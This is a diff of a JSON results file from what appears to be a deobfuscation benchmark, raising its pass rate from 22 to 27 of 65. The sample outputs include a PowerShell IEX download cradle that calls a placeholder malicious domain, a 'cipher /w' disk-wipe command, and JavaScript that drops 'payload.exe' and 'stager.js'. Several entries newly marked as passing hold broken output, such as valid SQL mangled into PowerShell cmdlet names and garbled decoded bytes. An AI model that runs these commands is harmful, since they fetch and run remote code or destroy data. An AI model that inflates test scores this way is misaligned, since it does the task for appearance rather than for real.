@@ -1,7 +1,7 @@
 {
   "total": 65,
-  "passed": 22,
-  "hit_rate": 0.3385,
+  "passed": 27,
+  "hit_rate": 0.4154,
   "threshold": 0.6,
   "results": [
     {
@@ -36,9 +36,10 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "extract-payload",
+        "powershell-alias-normalize",
         "ioc-extract"
       ],
-      "output_head": "IEX(iwr http://malicious-test-domain.top/x); connect 45.148.10.181",
+      "output_head": "IEX(Invoke-WebRequest http://malicious-test-domain.top/x); connect 45.148.10.181",
       "ok": true
     },
     {
@@ -64,9 +65,10 @@
       "chain": [
         "base64-decode",
         "xor-brute",
-        "ps-reconstruct"
+        "powershell-backtick-normalize",
+        "caesar-decode"
       ],
-      "output_head": "}\u00a4t$t\u00a4t$t$v\u00e4t$t\u00e4~\u00e4t%d,d\u0007d%`e\u00f4e\u00b8ele\u00d8e`exe0e`e\u0000e\u00f8e`d\u0080e`e`Tat`t`t~p$t}tdd$",
+      "output_head": "}\u00a4i$i\u00a4i$i$k\u00e4i$i\u00e4~\u00e4i%s,s\u0007s%t\u00f4t\u00b8tat\u00d8ttmt0tt\u0000t\u00f8ts\u0080ttIpiii~e$i}iss$",
       "ok": true
     },
     {
@@ -75,11 +77,10 @@
       "chain": [
         "base32-decode",
         "nibble-swap",
-        "base91-decode",
-        "xor-brute",
-        "xor-brute"
+        "powershell-backtick-normalize",
+        "base91-decode"
       ],
-      "output_head": "/<\u009c \u001d6\u00d5\u009a~\u00a4\u00af\u0089\u0084\u00fb\u009b\u008b\u00e6-,\u00d9\u0088iExE\u0011a\u008d9=>d\u00f2\u0015\u00f5B\u00fa TIT\u0092 {^k\u0091",
+      "output_head": "0\u0081\u0011\u00a8\u0087P\u000e\u0013\u0018\u0001\u00a8\u00f0\u00030\u0081\u0011\u00d0\u0004\u009a\u0000\u0013\u0018\u0081zP\u000f0\u0081\u0011L\u00f2",
       "ok": true
     },
     {
@@ -274,10 +275,12 @@
     },
     {
       "sha1": "ae757110d8a75c8a3a702187a2e906a01c8dda30",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "SELECT id, name FROM users WHERE active = 1;",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Select-Object id, name FROM users Where-Object active = 1;",
+      "ok": true
     },
     {
       "sha1": "8064f1b8d1e57ae9b384076d70eeed9b47ac6bf4",
@@ -327,23 +330,23 @@
     },
     {
       "sha1": "eb32fe579f52b910a0bcb15c09d78747b6d0e34f",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
       "output_head": "cipher /w:C:\\",
       "ok": false
     },
     {
       "sha1": "1584af34536103c086f163f599640acbb9f26155",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "set \"A=cmd\" && set \"B=/c \" && set \"C=whoami && netstat -ano\" && %A% %B% \"%C%\"",
+      "output_head": "whoami && netstat -ano",
       "ok": false
     },
     {
       "sha1": "5fd384bfadd38c3f124a8f654b47c069ee55dde9",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "powershell -e ABC",
+      "output_head": "ABC",
       "ok": false
     },
     {
@@ -359,28 +362,28 @@
       "sha1": "f18d46780fda16ff0927300bdc7cd4f7112bf2da",
       "engine": "llm-l3",
       "chain": [],
-      "output_head": "print(1+1)",
+      "output_head": "python -c 'print(1+1)'",
       "ok": false
     },
     {
       "sha1": "1b42e8db26f7d6de7901f6f19c7ee61de4b11df9",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
       "output_head": "notepad readme.txt",
       "ok": false
     },
     {
       "sha1": "d0a44a6f10acaf1cbdf099b429f6ab013d5b0882",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "output_head": "binary-A",
       "ok": false
     },
     {
       "sha1": "940b661e76ae57f083336270cf9646b56a91c2d7",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUE=';    var b=atob(d);    var l=document.createElement('a');    l.download='payload.exe';    l.href=URL",
+      "output_head": "binary-A",
       "ok": false
     },
     {
@@ -413,9 +416,9 @@
     },
     {
       "sha1": "f9f75777c6ec5ce767f90a3564eba599398a4d58",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "output_head": "binary-A",
       "ok": false
     },
     {
@@ -441,9 +444,9 @@
     },
     {
       "sha1": "892ed1156a4390ee17d9583a72b5c90eb1eca957",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUM=';        var b=atob(d);        var l=document.createElement('a');        l.download='stager.js';    ",
+      "output_head": "binary-C",
       "ok": false
     },
     {
@@ -455,9 +458,9 @@
     },
     {
       "sha1": "dc5969c50b2137c3bcf9e0105f44799198fe1dba",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUM=';            var b=atob(d);            var l=document.createElement('a');            l.download='sta",
+      "output_head": "binary-C",
       "ok": false
     },
     {
@@ -469,35 +472,38 @@
     },
     {
       "sha1": "6e2ab035d8c5951f1d91102d16be119683004146",
-      "engine": "magic",
-      "chain": [],
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize",
+        "crypto-detect"
+      ],
       "output_head": "function _0x29d5() { const t = ['mdq0ytfKmwy','mtG5nZqWrLrLEMLS','y3nZvgv4Da']; return t; }\n    (function(a, b) { const ",
-      "ok": false
+      "ok": true
     },
     {
       "sha1": "bd9eb6daa30c514127171560f23c7251407d3f49",
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 OpenSSL:AES-CBC          key_source=inline recovery=runtime-required",
       "ok": true
@@ -507,25 +513,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 ChaCha20                 key_source=inline recovery=runtime-required",
       "ok": true
@@ -535,25 +541,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 3DES                     key_source=inline recovery=runtime-required",
       "ok": true
@@ -563,25 +569,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 RC4                      key_source=inline recovery=runtime-required",
       "ok": true
@@ -591,25 +597,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 GPG-symmetric            key_source=inline recovery=runtime-required",
       "ok": true
@@ -619,25 +625,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 GPG-symmetric            key_source=inline recovery=runtime-required",
       "ok": true
@@ -647,25 +653,25 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
+        "powershell-backtick-normalize",
         "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator",
-        "crypto-api-annotator"
+        "powershell-backtick-normalize"
       ],
       "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 OpenSSL:AES-CBC          key_source=inline recovery=runtime-required",
       "ok": true
@@ -686,10 +692,12 @@
     },
     {
       "sha1": "1b2fa2c1cd7e555ce09d6046372293b7d771dee9",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "set \"p=calc.exe\" && start calc.exe",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "set \"p=c_a_l_c_._e_x_e\" && Start-Process %p:_=%",
+      "ok": true
     },
     {
       "sha1": "e43fc82dfe47d42a53b70957b028fec7853d3165",
@@ -700,10 +708,12 @@
     },
     {
       "sha1": "4b1a07b5a78dcdbea29be3c287903a41df793e2c",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "echo \"opening\" 'closing' \"another string\" 'and-another'",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Write-Output \"opening\" 'closing' \"another string\" 'and-another'",
+      "ok": true
     },
     {
       "sha1": "f87fa6b84bf4799448d1eca995e96ac9e533473e",
@@ -714,10 +724,12 @@
     },
     {
       "sha1": "2e26648e784ec7a0cf4d08534ddda41df35f1a30",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "echo hello",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Write-Output hello",
+      "ok": true
     }
   ]
 }
